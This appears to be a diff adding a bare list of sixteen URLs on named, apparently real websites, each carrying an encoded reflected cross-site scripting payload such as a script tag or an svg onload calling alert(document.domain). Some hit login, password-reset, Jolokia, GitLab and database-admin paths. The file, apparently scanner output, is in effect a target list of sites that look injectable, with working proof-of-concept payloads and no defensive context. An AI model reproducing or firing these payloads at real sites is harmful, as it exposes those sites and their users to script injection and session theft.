@@ -1,0 +1,16 @@
+http://airlineres.de/status%3E%3Cscript%3Ealert(31337)%3C%2Fscript%3E
+http://airlineslastminute.de/page/1%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+http://airline-travel.de/status%3E%3Cscript%3Ealert(31337)%3C%2Fscript%3E
+http://aktionsgruppe-freiburg.de/status%3E%3Cscript%3Ealert(31337)%3C%2Fscript%3E
+http://anti-algen-schwimmbadabdeckung.de/page/1%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+http://anton-ochsenkuehn.de/maxsite/page/1%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+http://api.dealonkel.de/login/forgetpswd.php?loginname=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&loginsys=1
+http://api.marketchecker.blackpinguin.de?lang=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E%3Cp%20class=%22&p=1
+http://apobo.de/gitlab/build_now%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+http://apollofood.de/lostpassword.php/%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+http://apotheke-blaustein.de/jolokia/read%3Csvg%20onload=alert%28document.domain%29%3E?mimeType=text/html
+http://apotheke.mundsburgtower.de/?s=%22%2F%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+http://ryxxc6lb.chemkoo.com/?db=mysql&server=db&table=event%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&username=root
+http://rz5tx.dierqi.com/maxsite/page/1%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+http://rzaex.baehui.com/does_not_exist%22%22%3E%3Cscript%3Ealert%28%22XSS%22%29%3C/script%3E%3Cimg%20src=x
+https://ryunique9.com/login.html?returnTo=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
